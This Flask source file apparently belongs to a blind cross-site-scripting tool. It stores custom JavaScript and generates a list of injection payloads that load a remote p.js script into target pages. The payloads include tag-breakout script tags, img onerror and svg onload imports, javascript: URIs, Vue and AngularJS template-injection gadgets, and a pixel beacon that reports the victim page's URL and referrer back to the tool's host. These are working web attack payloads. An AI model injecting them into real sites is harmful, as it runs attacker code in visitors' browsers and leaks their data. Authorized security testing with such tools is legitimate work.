# app/payloads.py
from __future__ import annotations

from urllib.parse import urlparse
from flask import Blueprint, render_template, request, abort, current_app
from .db import get_setting, set_setting
from .utils import require_basic_auth

bp = Blueprint("payloads", __name__)

@bp.route("/payloads", methods=["GET", "POST"])
@require_basic_auth
def payloads():
    # --- simpan custom JS ke DB kalau POST ---
    if request.method == "POST":
        code = request.form.get("code", "")
        set_setting("custom_js", code)
    # ----------------------------------------

    # bangun URL p.js & pixel seperti sebelumnya
    pub = current_app.config.get("PUBLIC_URL") or request.host_url.rstrip("/")
    parsed = urlparse(pub if "://" in pub else ("https://" + pub))
    netloc = parsed.netloc or request.host
    dbl = f"//{netloc}"

    pjs = f"{dbl}/p.js"
    events_url = "/events"

    variants = [
        ("SCRIPT src", f"<script src={pjs}></script>"),
        ("SCRIPT src with closing tag", f'"><script src={pjs}></script>'),
        ("SCRIPT src with closing and opening tag", f'"><script src={pjs}></script><x="'),
        ("jQuery", f'$.getScript("{pjs}")'),
        ("IMG onerror with closing tag", f'"><img src onerror=import("{pjs}")>'),
        ("IMG onerror no spaces with closing tag", f'"><img/src/onerror=import("{pjs}")>'),
        ("SVG script with closing tag", f'"><svg><script href={pjs} />'),
        ("SVG onload with closing tag", f'"><svg/onload=import("{pjs}")>'),
        ("Link based URI payload", f'javascript:import("{pjs}")'),
        ("VueJS v3", f'{{{{_openBlock.constructor(\'import("{pjs}")\')()}}}}'),
        ("VueJS v2 / AngularJS", f'{{{{constructor.constructor(\'import("{pjs}")\')()}}}}'),
        ("Create Element", "javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'"
                           + pjs + "\\';document.body.appendChild(a)')"),
        ("Plain JS", f"document.head.appendChild(Object.assign(document.createElement('script'),{{src:'{pjs}'}}));"),
        ("Pixel beacon (CSP-friendly)",
         f'<img referrerpolicy="no-referrer-when-downgrade" '
         f'src="{dbl}/c.gif?u=\'+encodeURIComponent(location)+\'&r=\'+encodeURIComponent(document.referrer)">'),
    ]
    full_js = f'<script src="{pjs}"></script>'

    # baca isi custom JS dari DB untuk diisi ke textarea
    try:
        code = get_setting("custom_js")
    except Exception:
        code = ""

    return render_template(
        "payloads.html",
        events_url=events_url,
        full_js=full_js,
        variants=variants,
        # editor props
        code=code,
    )